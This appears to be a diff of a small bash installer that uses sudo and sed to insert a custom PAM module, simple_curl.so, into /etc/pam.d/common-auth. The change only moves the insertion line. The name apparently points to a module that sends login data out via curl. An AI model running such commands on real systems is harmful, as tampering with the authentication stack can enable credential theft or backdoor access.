@@ -1,4 +1,4 @@
 #!/bin/bash
 
 # sudo cp bin/simple_curl.so /lib/security/simple_curl.so
-sudo sed -n -i 'p;18a auth\trequired\t\t\tsimple_curl.so' /etc/pam.d/common-auth
+sudo sed -n -i 'p;23a auth\trequired\t\t\tsimple_curl.so' /etc/pam.d/common-auth
